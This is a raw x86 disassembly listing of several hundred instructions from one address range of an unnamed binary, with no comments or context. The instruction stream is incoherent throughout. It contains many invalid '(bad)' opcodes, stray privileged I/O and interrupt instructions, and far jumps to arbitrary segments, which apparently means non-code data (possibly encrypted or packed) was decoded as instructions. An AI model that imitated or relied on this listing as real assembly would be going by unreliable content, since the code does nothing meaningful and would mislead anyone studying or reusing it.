  418cf7:	scas   eax,DWORD PTR es:[edi]
  418cf8:	int3   
  418cf9:	sub    eax,0xc6dd6772
  418cfe:	into   
  418cff:	push   0x67
  418d01:	mov    dl,0xe6
  418d03:	test   eax,0x382da49b
  418d08:	dec    edi
  418d09:	fisttp DWORD PTR [ebx+0x24]
  418d0c:	popa   
  418d0d:	dec    esp
  418d0e:	dec    edi
  418d0f:	add    edi,DWORD PTR [esi]
  418d11:	pop    esi
  418d12:	cs inc esi
  418d14:	rcl    edx,1
  418d16:	push   cs
  418d17:	dec    ecx
  418d18:	inc    edi
  418d19:	add    ecx,ebx
  418d1b:	cli    
  418d1c:	xor    BYTE PTR [ecx+0x62],0x78
  418d20:	fmul   st(1),st
  418d22:	xchg   ecx,eax
  418d23:	lea    eax,[esi-0x16219fdb]
  418d29:	shl    DWORD PTR [edx+ecx*4],cl
  418d2c:	jnp    0x418cbc
  418d2e:	fcomp  DWORD PTR [ebp-0x29]
  418d31:	lods   eax,DWORD PTR ds:[esi]
  418d32:	jecxz  0x418cf8
  418d34:	sti    
  418d35:	cs imul ecx,DWORD PTR cs:[eax+0x35],0x65
  418d3b:	(bad)  
  418d3c:	into   
  418d3d:	int    0xe4
  418d3f:	outs   dx,DWORD PTR ds:[esi]
  418d40:	sub    BYTE PTR [edi+eax*4+0x44],dl
  418d44:	inc    esi
  418d45:	pushf  
  418d46:	and    al,0x44
  418d48:	mov    cl,0x81
  418d4a:	mov    cl,0x3b
  418d4c:	dec    ebp
  418d4d:	out    0x2d,eax
  418d4f:	aas    
  418d50:	test   BYTE PTR [edi+0x62a63e68],dh
  418d56:	dec    BYTE PTR ds:0xff9fdb4c
  418d5c:	sub    eax,0x951ce8b6
  418d61:	in     eax,dx
  418d62:	mov    BYTE PTR [edx],ch
  418d64:	out    0xd2,eax
  418d66:	xor    DWORD PTR [ebx],esp
  418d68:	stos   BYTE PTR es:[edi],al
  418d69:	jge    0x418daf
  418d6b:	loopne 0x418dc1
  418d6d:	xor    DWORD PTR [edx+0x7db3108c],edi
  418d73:	mov    edx,0xca3a339e
  418d78:	into   
  418d79:	(bad)  
  418d7a:	mov    WORD PTR [ecx+0xb],es
  418d7d:	sbb    edx,DWORD PTR [ecx+0x75]
  418d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d81:	data16 aas 
  418d83:	or     BYTE PTR ds:0x35c5e34d,dl
  418d89:	jae    0x418d45
  418d8b:	sbb    al,0x71
  418d8d:	stos   DWORD PTR es:[edi],eax
  418d8e:	ds jne 0x418dc3
  418d91:	or     edx,DWORD PTR [ecx+0x6397d590]
  418d97:	xchg   esp,eax
  418d98:	outs   dx,BYTE PTR ds:[esi]
  418d99:	rcl    BYTE PTR [ebx],1
  418d9b:	out    dx,al
  418d9c:	(bad)  
  418d9e:	jnp    0x418d56
  418da0:	push   edx
  418da1:	aaa    
  418da2:	or     eax,0x7ffdcb3b
  418da7:	or     dh,BYTE PTR [esi+0x9]
  418daa:	mov    ds:0xd50d7b35,al
  418daf:	dec    esi
  418db0:	pop    ebp
  418db1:	adc    al,0xf
  418db3:	jno    0x418df7
  418db5:	(bad)  
  418db6:	test   al,0xca
  418db8:	adc    eax,DWORD PTR [edi]
  418dba:	and    al,0xa5
  418dbc:	pop    ds
  418dbd:	cmp    ebx,DWORD PTR [edi-0x1a]
  418dc0:	sbb    DWORD PTR [edx-0x12],esp
  418dc3:	fisttp DWORD PTR [ebx+0x63757a7e]
  418dc9:	and    ebp,DWORD PTR gs:[eax+0x6e]
  418dcd:	dec    edi
  418dce:	and    DWORD PTR [edi],edi
  418dd0:	push   edx
  418dd1:	stos   BYTE PTR es:[edi],al
  418dd2:	mov    BYTE PTR [ebp+0x7eb28b72],ch
  418dd8:	sahf   
  418dd9:	sub    ah,BYTE PTR [esi+0x28]
  418ddc:	fst    DWORD PTR [ecx]
  418dde:	xor    eax,DWORD PTR [ecx]
  418de0:	hlt    
  418de1:	sub    BYTE PTR ds:0xe7810f45,0x7e
  418de8:	js     0x418e10
  418dea:	out    dx,eax
  418deb:	jns    0x418e18
  418ded:	mov    al,0x81
  418def:	xor    edi,DWORD PTR [esp+eiz*8]
  418df2:	jmp    0xe27a07fb
  418df7:	test   al,0xe
  418df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dfa:	or     esp,DWORD PTR [ebp+0x2884c0e1]
  418e00:	push   esi
  418e01:	jge    0x418e69
  418e03:	das    
  418e04:	mov    bl,0xf6
  418e06:	sar    DWORD PTR [eax+0x7a],1
  418e09:	into   
  418e0a:	mov    edx,0x680941fe
  418e0f:	pop    esi
  418e10:	je     0x418e0f
  418e12:	adc    al,0x3
  418e14:	add    al,0x21
  418e16:	inc    eax
  418e17:	out    dx,al
  418e18:	ds xchg edx,eax
  418e1a:	ror    DWORD PTR ds:0xa2e97faa,cl
  418e20:	pushf  
  418e21:	shl    esp,0x4d
  418e24:	push   ebx
  418e25:	mov    edi,ebx
  418e27:	add    BYTE PTR [eax+edi*1],0x2b
  418e2b:	js     0x418e65
  418e2d:	popa   
  418e2e:	sbb    ebx,ebx
  418e30:	jae    0x418e7f
  418e32:	mov    ebp,0x92b4e4bf
  418e37:	ror    cl,1
  418e39:	sub    al,0xe8
  418e3b:	inc    edi
  418e3c:	dec    edi
  418e3d:	div    BYTE PTR [ebx-0x21]
  418e40:	test   al,0x52
  418e42:	lods   eax,DWORD PTR ds:[esi]
  418e43:	fwait
  418e44:	pushf  
  418e45:	adc    ecx,DWORD PTR [esi]
  418e47:	pop    eax
  418e48:	test   ebp,0x3b376d03
  418e4e:	sub    edx,DWORD PTR [ecx+0x74be93bb]
  418e54:	out    0x91,eax
  418e56:	push   0xffffffb0
  418e58:	(bad)  
  418e59:	outs   dx,DWORD PTR ds:[esi]
  418e5a:	ret    0x5f84
  418e5d:	cmc    
  418e5e:	jg     0x418e77
  418e60:	lock push 0xffffffe6
  418e63:	retw   0x9adb
  418e67:	cli    
  418e68:	jg     0x418ee7
  418e6a:	icebp  
  418e6b:	retf   
  418e6c:	and    eax,0xa0df178
  418e71:	adc    BYTE PTR cs:[ecx-0x20],bl
  418e75:	sahf   
  418e76:	loopne 0x418e1a
  418e78:	std    
  418e79:	inc    ebx
  418e7a:	mov    ds:0x54a2d335,al
  418e7f:	push   edi
  418e80:	test   eax,0xc79d0a84
  418e85:	pushf  
  418e86:	popf   
  418e87:	xlat   BYTE PTR ds:[ebx]
  418e88:	sbb    eax,0x1df8b3aa
  418e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e8e:	sahf   
  418e8f:	and    eax,0xfaaa5333
  418e94:	fs jbe 0x418ead
  418e97:	sahf   
  418e98:	mov    esp,0x305218e3
  418e9d:	push   0x3c
  418e9f:	mov    ds,esi
  418ea1:	retf   0xad20
  418ea4:	fs dec eax
  418ea6:	cmc    
  418ea7:	lock inc edx
  418ea9:	into   
  418eaa:	ins    BYTE PTR es:[edi],dx
  418eab:	scas   eax,DWORD PTR es:[edi]
  418eac:	pop    ecx
  418ead:	aaa    
  418eae:	ror    DWORD PTR [edi+0x5070777],cl
  418eb4:	sti    
  418eb5:	and    dh,BYTE PTR [edx]
  418eb7:	mov    al,ds:0xb2aa5688
  418ebc:	jmp    0xb2af44af
  418ec1:	mul    BYTE PTR [ecx-0x4513b033]
  418ec7:	xchg   BYTE PTR cs:[ebp+0x76],dh
  418ecb:	push   es
  418ecc:	aam    0xef
  418ece:	popf   
  418ecf:	xor    al,0xc7
  418ed1:	call   0xcf04:0xdcc47864
  418ed8:	bnd ret 0x6adb
  418edc:	pop    ebp
  418edd:	and    dh,BYTE PTR [esi+0x5394572f]
  418ee3:	add    al,0xfe
  418ee5:	fild   WORD PTR [ebp+0x40457b6e]
  418eeb:	loopne 0x418efb
  418eed:	push   es
  418eee:	pop    eax
  418eef:	cmp    BYTE PTR [edi],al
  418ef1:	add    edx,esp
  418ef3:	in     eax,0xab
  418ef5:	out    0xc1,eax
  418ef7:	dec    esi
  418ef8:	xadd   BYTE PTR [edi-0x52],bh
  418efc:	sub    DWORD PTR [ecx+0x56],esp
  418eff:	dec    edi
  418f00:	xor    ch,BYTE PTR [esi+0x6d]
  418f03:	int    0x8c
  418f05:	sbb    edx,eax
  418f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f08:	jmp    0x3b187904
  418f0d:	hlt    
  418f0e:	mov    ds:0x7a721fbc,al
  418f13:	sbb    dh,ch
  418f15:	and    al,0x13
  418f17:	ret    
  418f18:	sub    eax,0x2a7762f5
  418f1d:	sbb    eax,0x38e9ee97
  418f22:	fisub  WORD PTR [edx+0x7c]
  418f25:	xchg   edx,eax
  418f26:	xor    al,0x34
  418f28:	pop    edi
  418f29:	jl     0x418f4b
  418f2b:	in     al,dx
  418f2c:	addr16 (bad) 
  418f2e:	daa    
  418f2f:	jp     0x418f4d
  418f31:	and    eax,0x79955563
  418f36:	jae    0x418f51
  418f38:	iret   
  418f39:	or     dh,BYTE PTR [eax-0x71]
  418f3c:	add    DWORD PTR [ebx],edi
  418f3e:	mov    bh,BYTE PTR [edx]
  418f40:	sub    ebx,DWORD PTR [ecx+0x7e4e87c1]
  418f46:	icebp  
  418f47:	ret    0x5d73
  418f4a:	icebp  
  418f4b:	push   ebx
  418f4c:	inc    eax
  418f4d:	push   edx
  418f4e:	jecxz  0x418fb3
  418f50:	push   0x8987750d
  418f55:	adc    eax,0x5a933104
  418f5a:	jne    0x418f07
  418f5c:	adc    edx,esi
  418f5e:	lods   al,BYTE PTR ds:[esi]
  418f5f:	pop    ds
  418f60:	test   eax,0x6faa167d
  418f65:	lea    edx,[esi]
  418f67:	arpl   WORD PTR [edx],di
  418f69:	je     0x418efe
  418f6b:	int    0x2f
  418f6d:	pop    esi
  418f6e:	sub    dl,BYTE PTR [ecx]
  418f70:	call   0x9ebc:0x9bf8328
  418f77:	pop    ebp
  418f78:	js     0x418ff8
  418f7a:	jmp    0x418f27
  418f7c:	out    dx,al
  418f7d:	fistp  WORD PTR ss:[ebp+edi*4+0x2f97815f]
  418f85:	loope  0x418fe1
  418f87:	xchg   edx,eax
  418f88:	inc    ebp
  418f89:	enter  0xa9c0,0x78
  418f8d:	mov    edx,0xd39d516
  418f92:	and    eax,0x4abee13b
  418f97:	push   ecx
  418f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f99:	cmc    
  418f9a:	popa   
  418f9b:	imul   dh
  418f9d:	mov    bh,0xf6
  418f9f:	pop    ds
  418fa0:	ds cmp edi,eax
  418fa3:	mov    BYTE PTR [edx+eax*2],ah
  418fa6:	pop    esp
  418fa7:	mov    edi,0x15c2a8d9
  418fac:	push   0xed7fefc2
  418fb1:	dec    ebp
  418fb2:	stc    
  418fb3:	jne    0x418fee
  418fb5:	cmc    
  418fb6:	mov    edx,0x8f4d45f0
  418fbb:	xlat   BYTE PTR ds:[ebx]
  418fbc:	push   edi
  418fbd:	inc    esp
  418fbe:	xchg   esp,eax
  418fbf:	xchg   esi,eax
  418fc0:	jne    0x418fc6
  418fc2:	mov    WORD PTR [eax-0x22d58cb0],gs
  418fc8:	sahf   
  418fc9:	shl    DWORD PTR [edx-0xe4d3f8f],cl
  418fcf:	push   ecx
  418fd0:	inc    ebp
  418fd1:	add    bl,BYTE PTR ds:0x8b26fe7e
  418fd7:	mov    dh,0x67
  418fd9:	test   BYTE PTR [ecx-0x9643a88],bl
  418fdf:	shl    BYTE PTR [ebx],cl
  418fe1:	jo     0x418f86
  418fe3:	jecxz  0x418ffd
  418fe5:	sub    bh,BYTE PTR [esi+0x40]
  418fe8:	shr    BYTE PTR cs:[esi-0x44],0xa7
  418fed:	pop    esp
  418fee:	shl    BYTE PTR [edx+0xc],cl
  418ff1:	mov    cs,ebp
  418ff3:	aam    0x4f
  418ff5:	mov    al,0xbe
  418ff7:	push   cs
  418ff8:	(bad)  
  418ff9:	int    0xcc
  418ffb:	cmp    eax,0xd312ae66
  419000:	fxam   
  419002:	push   eax
  419003:	add    al,0xed
  419005:	mov    ebx,0xf15ff865
  41900a:	outs   dx,DWORD PTR ds:[esi]
  41900b:	cwde   
  41900c:	mov    bl,0x8c
  41900e:	pop    ebp
  419010:	scas   eax,DWORD PTR es:[edi]
  419011:	ficom  WORD PTR [esi]
  419014:	call   0xb56f1fa9
  419019:	cs test eax,0x9c89aa94
  41901f:	inc    edx
  419020:	ror    ah,cl
  419022:	popa   
  419023:	call   0x4ef6:0xf916b3c3
  41902a:	push   0x15fcfe3d
  41902f:	dec    eax
  419030:	sti    
  419031:	ins    BYTE PTR es:[edi],dx
  419032:	stc    
  419033:	fsub   st,st(4)
  419035:	leave  
  419036:	lock mov al,fs:0xa0fdc946
  41903d:	test   BYTE PTR [edx+0x62eecdfe],dh
  419043:	arpl   WORD PTR [esi-0x59996aa9],cx
  419049:	shl    DWORD PTR [ebx+0x45],cl
  41904c:	jno    0x419061
  41904e:	and    BYTE PTR [eax+0x280e4162],ah
  419054:	shr    BYTE PTR [esi+0x6f],0x8c
  419058:	xor    ebx,DWORD PTR [eax+0x2df41ccc]
  41905e:	add    al,0x3d
  419060:	nop
  419061:	fwait
  419062:	addr16 cmp al,0xf1
  419065:	(bad)
  41906a:	aaa    
  41906b:	mov    dh,0x51
  41906d:	sti    
  41906e:	std    
  41906f:	fdivr  st(6),st
  419071:	push   esi
  419072:	jmp    0x41906f
  419074:	mov    ecx,0x918b0104
  419079:	push   ecx
  41907a:	pop    esp
  41907b:	push   edx
  41907c:	jbe    0x419071
  41907e:	xor    eax,0xb24e76f8
  419083:	mov    cl,0x87
  419085:	pop    esi
  419086:	cmpps  xmm2,xmm6,0x2f
  41908a:	mov    esi,0x7aa1f0e3
  41908f:	mov    ds:0x6b298893,eax
  419094:	jmp    0x4e0a0840
  419099:	test   DWORD PTR [eax+0x2d64baac],0xbed7599d
  4190a3:	aad    0xab
  4190a5:	inc    esp
  4190a6:	imul   ebp,DWORD PTR [edi+0x7c30e989],0x7f
  4190ad:	in     eax,0xdf
  4190af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190b0:	mov    edi,0x6e2cdca0
  4190b5:	fsubp  st(7),st
  4190b7:	xor    edx,eax
  4190b9:	sub    edx,DWORD PTR [ebx]
  4190bb:	mov    edx,0x87c787e4
  4190c0:	sub    eax,0x7e0752f8
  4190c5:	dec    eax
  4190c6:	xchg   edi,eax
  4190c7:	fnstcw WORD PTR [eax+0x35]
  4190ca:	pop    edx
  4190cb:	sub    al,0x52
  4190cd:	test   al,0xd4
  4190cf:	xchg   esi,eax
  4190d0:	test   DWORD PTR [ebp-0x66282331],esp
  4190d6:	mov    ds:0x35927413,al
  4190db:	mov    bl,0xde
  4190dd:	or     DWORD PTR [eax+0x7c40a46f],esi
  4190e3:	and    al,0xc2
  4190e5:	dec    ecx
  4190e6:	mov    ds:0xba9698c5,al
  4190eb:	call   0x8dea:0x2cf91a9
  4190f2:	sbb    DWORD PTR [ecx-0x5c],esp
  4190f5:	mov    ecx,0x33f55487
  4190fa:	or     edx,ebx
  4190fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190fd:	add    ch,dl
  4190ff:	xchg   ebp,eax
  419100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419101:	inc    ecx
  419102:	mov    eax,0x7c2d306e
  419107:	shr    DWORD PTR [eax-0x1d94e943],1
  41910d:	fadd   QWORD PTR [eax]
  41910f:	mov    dh,0xfa
  419111:	sub    eax,0x849f543f
  419116:	int3   
  419117:	stos   BYTE PTR es:[edi],al
  419118:	xor    al,BYTE PTR [ecx-0x1f476784]
  41911e:	dec    ebp
  41911f:	shl    BYTE PTR ds:0x69e8f534,cl
  419125:	gs or  al,0x87
  419128:	inc    ebp
  419129:	mov    bl,0xab
  41912b:	imul   esp,DWORD PTR [esi],0x2805c616
  419131:	xor    al,0xe6
  419133:	jmp    0x4190e4
  419135:	xchg   esp,eax
  419136:	and    ebp,DWORD PTR [esi]
  419138:	sub    cl,BYTE PTR [edi+0x3206bee6]
  41913e:	push   ebx
  41913f:	cli    
  419140:	dec    edx
  419141:	pop    ebp
  419142:	mov    fs,WORD PTR [edx-0x7]
  419145:	retf   
  419146:	stc    
  419147:	xchg   ecx,eax
  419148:	dec    edx
  419149:	push   cs
  41914a:	sub    eax,0x5376abd7
  41914f:	mov    ds:0x4c834b2f,eax
  419154:	and    BYTE PTR [esi+edx*1+0x8],bh
  419158:	in     eax,0xbd
  41915a:	xchg   ebp,esi
  41915c:	push   esp
  41915d:	add    eax,esp
  41915f:	sbb    BYTE PTR [edi],ch
  419161:	shl    DWORD PTR [edx],0x84
  419164:	cmp    DWORD PTR [eax+0x3feda283],esp
  41916a:	cmp    BYTE PTR [eax*1-0x3775ccf9],bl
  419171:	call   0x1b1d:0x705b6389
  419178:	mov    eax,ds:0x3f0a4d35
  41917d:	ret    0x1a8c
  419180:	fist   WORD PTR [eax-0x4d6b6404]
  419186:	cmp    esp,ebx
  419188:	mov    cl,0xd
  41918a:	cdq    
  41918b:	jmp    0x57e3:0xf41e3a23
  419192:	in     eax,0xf4
  419194:	(bad)
  419197:	mov    ebx,0x72651c71
  41919c:	and    ch,BYTE PTR [eiz*2-0x15dfdc95]
  4191a3:	cs ins DWORD PTR es:[edi],dx
  4191a5:	pop    esi
  4191a6:	pop    es
  4191a7:	jmp    0xfae8:0x4c8949c0
  4191ae:	sbb    ebx,ecx
  4191b0:	fisub  WORD PTR [edx+0x62]
  4191b3:	dec    BYTE PTR [eax-0x7e5d44a7]
  4191b9:	stos   DWORD PTR es:[edi],eax
  4191ba:	mov    esp,0x36130bfe
  4191bf:	cs out dx,al
  4191c1:	xchg   edi,eax
  4191c2:	in     eax,dx
  4191c3:	or     DWORD PTR [edx],esp
  4191c5:	dec    esi
  4191c6:	xchg   ebp,eax
  4191c7:	adc    edi,ebx
  4191c9:	sar    ebx,cl
  4191cb:	ins    DWORD PTR es:[edi],dx
  4191cc:	inc    esi
  4191cd:	mov    al,ds:0xb3fb202e
  4191d2:	jo     0x4191c0
  4191d4:	test   bl,dh
  4191d6:	out    0xc0,al
  4191d8:	in     al,dx
  4191d9:	fsub   DWORD PTR [eax+0x5e]
  4191dc:	int    0x16
  4191de:	jo     0x4191d1
  4191e0:	mov    ch,0xd1
  4191e2:	dec    ebp
  4191e3:	cmp    al,0x75
  4191e5:	sub    ebx,DWORD PTR [edi-0x4a03cc3c]
  4191eb:	push   ds
  4191ec:	mov    dh,0x5c
  4191ee:	leave  
  4191ef:	in     al,dx
  4191f0:	shr    BYTE PTR [ecx-0x2f],0xce
  4191f4:	dec    edi
  4191f5:	or     BYTE PTR cs:[esi],ah
  4191f8:	pusha  
  4191f9:	push   eax
  4191fa:	inc    esp
  4191fb:	sahf   
  4191fc:	jp     0x419225
  4191fe:	ror    DWORD PTR [ecx+0x38],0x6f
  419202:	mov    edx,0xbd16bc5a
  419207:	pop    ebx
  419208:	xor    BYTE PTR [ebp-0x1],bl
  41920b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41920c:	sub    BYTE PTR [edx],0xec
  41920f:	or     edi,DWORD PTR [eax]
  419211:	sub    ebx,eax
  419213:	ficomp WORD PTR [esp+ebp*2+0x7d70c61b]
  41921a:	pop    es
  41921b:	dec    edx
  41921c:	loopne 0x419294
  41921e:	pop    esi
  41921f:	les    esp,FWORD PTR [edi]
  419221:	aad    0xcd
  419223:	test   dl,0xa4
  419226:	enter  0x3382,0x24
  41922a:	fld    TBYTE PTR [edi-0x1d]
  41922d:	and    ecx,eax
  41922f:	or     BYTE PTR [ebp-0x115964b6],ch
  419235:	xchg   edi,eax
  419236:	jmp    0xcc68:0xda66b784
  41923d:	cwde   
  41923e:	out    0x77,eax
  419240:	cld    
  419241:	xchg   esi,eax
  419242:	ret    0x6aea
  419245:	sbb    al,0xe6
  419247:	push   ebx
  419248:	add    ch,bh
  41924a:	mov    ebx,DWORD PTR [esi+eax*2-0x14]
  41924e:	std    
  41924f:	daa    
  419250:	mov    esp,DWORD PTR [eax+0x12]
  419253:	sahf   
  419254:	sub    ecx,DWORD PTR [esi-0x63]
  419257:	pop    esp
  419258:	mov    BYTE PTR [ebp-0x10],dl
  41925b:	adc    eax,0xc2c688e2
  419260:	(bad)  
  419261:	and    dh,BYTE PTR [edi+esi*1]
  419264:	shl    DWORD PTR [edi],0xc5
  419267:	push   edi
  419268:	lahf   
  419269:	jo     0x41921b
  41926b:	adc    al,0x95
  41926d:	xor    DWORD PTR [ebx+eiz*8],esp
  419270:	das    
  419271:	xchg   esp,eax
  419272:	sub    BYTE PTR [edi],al
  419274:	xchg   edi,eax
  419275:	mov    ah,0x90
  419277:	dec    al
  419279:	inc    esp
  41927a:	push   DWORD PTR [ebx-0x4d]
  41927d:	out    0x1,eax
  41927f:	lods   eax,DWORD PTR ds:[esi]
  419280:	add    al,0xf7
  419282:	idiv   BYTE PTR [ebx+0x2c]
  419285:	(bad)
  419288:	sbb    dh,BYTE PTR [ebx-0x6]
  41928b:	pushf  
  41928c:	test   eax,0x1e576834
  419291:	sbb    bl,BYTE PTR [edi+edx*8]
  419294:	add    ah,cl
  419296:	mov    ds:0x27d3646d,al
  41929b:	mov    al,0x13
  41929d:	icebp  
  41929e:	popf   
  41929f:	stos   BYTE PTR es:[edi],al
  4192a0:	popa   
  4192a1:	and    al,0x52
  4192a3:	xchg   ebx,eax
  4192a4:	data16 ss test al,0x9b
  4192a8:	xor    ecx,0xa9bb2284
  4192ae:	add    DWORD PTR [edx-0x60],eax
  4192b1:	adc    edx,DWORD PTR [ecx]
  4192b3:	or     bh,bh
  4192b5:	test   DWORD PTR [edi+ebp*4+0x62],esp
  4192b9:	lock push 0xffffff86
  4192bc:	in     al,0x7a
  4192be:	add    dl,0x63
  4192c1:	std    
  4192c2:	and    BYTE PTR ds:0x2299d06a,dh
  4192c8:	loope  0x419319
  4192ca:	aad    0xa5
  4192cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ce:	sbb    al,0xe5
  4192d0:	dec    esp
  4192d1:	popa   
  4192d2:	inc    eax
  4192d3:	aas    
  4192d4:	add    eax,ecx
  4192d6:	leave  
  4192d7:	fimul  DWORD PTR [esi+0x59]
  4192da:	push   ds
  4192db:	cmp    edx,DWORD PTR [ebp-0x611a0f6d]
  4192e1:	push   ebx
  4192e2:	hlt    
  4192e3:	jbe    0x4192af
  4192e5:	cmp    esp,esi
  4192e7:	push   DWORD PTR [ebp-0x16813afe]
  4192ed:	mov    ch,0x6
  4192ef:	fisub  DWORD PTR [eax+esi*8+0x72]
  4192f3:	adc    dh,BYTE PTR [edi-0x2e]
  4192f6:	inc    ebp
  4192f7:	repnz cmp eax,0xd227ff9d
  4192fd:	sbb    DWORD PTR [edi+esi*4-0x731212ad],ebx
  419304:	les    esi,FWORD PTR [esi]
  419306:	lahf   
  419307:	leave  
  419308:	int3   
  419309:	out    0x5f,eax
  41930b:	cwde   
  41930c:	push   edi
  41930d:	loop   0x4192f6
  41930f:	fadd   QWORD PTR [edx-0x47c4b1fe]
  419315:	ds xor esp,ebx
  419318:	jno    0x419398
  41931a:	sahf   
  41931b:	test   BYTE PTR [ebx+0x5e],al
  41931e:	test   al,0x79
  419320:	pop    eax
  419321:	sub    edx,DWORD PTR [esi]
  419323:	inc    edi
  419324:	fild   DWORD PTR ds:0xbdb615fc
  41932a:	test   al,0x92
  41932c:	or     ah,BYTE PTR [ebp+0x3160a9b5]
  419332:	pop    es
  419333:	icebp  
  419334:	jbe    0x41931c
  419336:	inc    esp
  419337:	push   es
  419338:	gs dec cx
  41933b:	and    eax,0x9f2b3e3
  419340:	add    esi,DWORD PTR [eax+ecx*4]
  419343:	mov    al,ds:0x6d7304b2
  419348:	pop    edx
  419349:	lahf   
  41934a:	push   edi
  41934b:	mov    dl,0x59
  41934d:	push   eax
  41934e:	lods   eax,DWORD PTR ds:[esi]
  41934f:	shr    DWORD PTR [eax],0x48
  419352:	popa   
  419353:	inc    ecx
  419354:	cmp    esi,DWORD PTR [eax]
  419356:	cmp    ebp,edi
  419358:	sub    dh,BYTE PTR [ecx-0x2fab9516]
  41935e:	pop    edi
  41935f:	push   ss
  419360:	mov    al,ds:0xed9dc08e
  419365:	retf   
  419366:	cld    
  419367:	sbb    eax,0xc335589
  41936c:	pop    ecx
  41936d:	jb     0x4193ed
  41936f:	jge    0x419352
  419371:	jbe    0x419349
  419373:	adc    dl,0x83
  419376:	(bad)
  41937a:	mov    DWORD PTR [ebx],edi
  41937c:	call   0xba4f837f
  419381:	push   eax
  419382:	push   ss
  419383:	jns    0x41931e
  419385:	sub    ebp,DWORD PTR [esi-0x1d]
  419388:	rol    DWORD PTR [ebx+0x15eeb9d4],0xc3
  41938f:	rcl    DWORD PTR [edi-0x40],cl
  419392:	mov    al,0xb6
  419394:	xor    dl,BYTE PTR [ecx]
  419396:	dec    ecx
  419397:	add    dx,WORD PTR [edi+0x1fa5db92]
  41939e:	outs   dx,DWORD PTR ds:[esi]
  41939f:	(bad)  
  4193a0:	jmp    0x41937a
  4193a2:	inc    edi
  4193a3:	sar    ebx,0x2f
  4193a6:	ret    0x2a20
  4193a9:	iret   
  4193aa:	fcomp  DWORD PTR [edx+0x59]
  4193ad:	or     al,0x1b
  4193af:	adc    DWORD PTR [ebp-0x40fbca29],esp
  4193b5:	add    eax,0xc9946f4f
  4193ba:	jmp    edi
  4193bc:	jp     0x41942b
  4193be:	dec    ebx
  4193bf:	(bad)  
  4193c1:	mov    edi,DWORD PTR [edx]
  4193c3:	mov    esp,0x9284a505
  4193c8:	jbe    0x4193dd
  4193ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193cc:	stc    
  4193cd:	dec    edi
  4193ce:	dec    esi
  4193cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193d0:	loopne 0x419379
  4193d2:	(bad)  
  4193d3:	sti    
  4193d4:	dec    esp
  4193d5:	inc    ebp
  4193d6:	je     0x4193f4
  4193d8:	inc    ecx
  4193d9:	adc    DWORD PTR [ecx-0x2f],ebx
  4193dc:	leave  
  4193dd:	mov    BYTE PTR [ecx-0x77],dl
  4193e0:	mov    ah,0x91
  4193e2:	dec    ecx
  4193e3:	adc    eax,ebp
  4193e5:	mov    BYTE PTR [ebx+0x74c5b429],bl
  4193eb:	mov    WORD PTR [edx+ebp*1+0x55],fs
  4193ef:	lds    esi,FWORD PTR [ecx+ebp*1]
  4193f2:	ja     0x419397
  4193f4:	jns    0x4193fe
  4193f6:	cmp    DWORD PTR [ebx+ebp*4+0x2a],ebp
  4193fa:	sbb    al,0xc3
  4193fc:	add    bh,bh
  4193fe:	push   ebp
  4193ff:	adc    BYTE PTR [eax],0xb
  419402:	push   0xffffffb5
  419404:	scas   eax,DWORD PTR es:[edi]
  419405:	or     BYTE PTR [ebx-0x4ef07421],0x18
  41940c:	pop    eax
  41940d:	mov    ch,0x53
  41940f:	inc    esp
  419410:	inc    ebp
  419411:	mov    ebx,0xceb46696
  419416:	jae    0x4193d0
  419418:	push   es
  419419:	and    edi,ecx
  41941b:	loop   0x41941f
  41941d:	mov    esp,0xe50d740f
  419422:	shl    BYTE PTR [edx-0x7b],cl
  419425:	xor    DWORD PTR [eax-0x3720814],eax
  41942b:	mov    DWORD PTR [ebx],edi
  41942d:	ror    BYTE PTR [edi],1
  41942f:	or     eax,0xc99d65a
  419434:	jae    0x41947f
  419436:	mov    edx,0xc2326093
  41943b:	pop    ss
  41943c:	sub    cl,dl
  41943e:	or     ebx,eax
  419440:	dec    edi
  419441:	loopne 0x419411
  419443:	pop    eax
  419444:	jae    0x4194c4
  419446:	retf   
  419447:	dec    ebx
  419448:	dec    esi
  419449:	sbb    eax,0x2575168e
  41944e:	lods   al,BYTE PTR ds:[esi]
  41944f:	mul    DWORD PTR [eax+0x5e]
  419452:	jmp    0x889b:0xa537b078
  419459:	xor    BYTE PTR [ebx+0x16],0x1b
  41945d:	les    esp,FWORD PTR [edi+0x7e]
  419460:	mov    al,0xf6
  419462:	inc    edi
  419463:	hlt    
  419464:	jnp    0x419488
  419466:	in     eax,dx
  419467:	pop    edx
  419468:	push   cs
  419469:	mov    esp,0x7b63ab6c
  41946e:	call   0x90be2a4
  419473:	fcom   DWORD PTR [ebx]
  419475:	out    0xe0,eax
  419477:	es scas al,BYTE PTR es:[edi]
  419479:	hlt    
  41947a:	popf   
  41947b:	pusha  
  41947c:	call   0x9ccb1e9d
  419481:	push   ds
  419482:	dec    ebx
  419483:	dec    eax
  419484:	mov    bl,0xc5
  419486:	leave  
  419487:	in     eax,dx
  419488:	int    0x6a
  41948a:	mov    DWORD PTR ds:0x39b13329,edi
  419490:	xchg   edx,eax
  419491:	push   ss
  419492:	jmp    0x7fc1:0x314ad92e
  419499:	fmul   DWORD PTR [edi+0x73]
  41949c:	xor    al,0xee
  41949e:	cli    
  41949f:	add    eax,0x13aed5f8
  4194a4:	loop   0x419435
  4194a6:	ficom  DWORD PTR [edi]
  4194a8:	cmp    eax,0x2b987eb5
  4194ad:	add    BYTE PTR [edi-0x21],bh
  4194b0:	(bad)  
  4194b1:	cmp    al,0x1a
  4194b3:	sbb    al,0xb9
  4194b5:	push   es
  4194b6:	xchg   ebp,eax
  4194b7:	inc    edx
  4194b8:	shr    esi,1
  4194ba:	adc    esp,esi
  4194bc:	adc    BYTE PTR [edx-0x5c047ef],bh
  4194c2:	cli    
  4194c3:	fsubr  DWORD PTR [edx+0x7fde691b]
